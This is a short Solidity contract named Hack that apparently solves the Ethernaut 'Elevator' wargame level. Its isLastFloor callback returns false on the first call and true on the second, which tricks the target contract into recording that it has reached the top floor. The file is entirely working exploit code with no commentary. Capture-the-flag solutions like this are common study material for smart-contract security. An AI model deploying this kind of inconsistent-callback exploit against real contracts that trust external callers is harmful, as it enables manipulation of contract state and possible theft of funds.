pragma solidity ^0.8;

interface IElevator {
    function goTo(uint) external;
    function top() external view returns (bool);
}

contract Hack {
    IElevator private immutable target;
    uint count;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}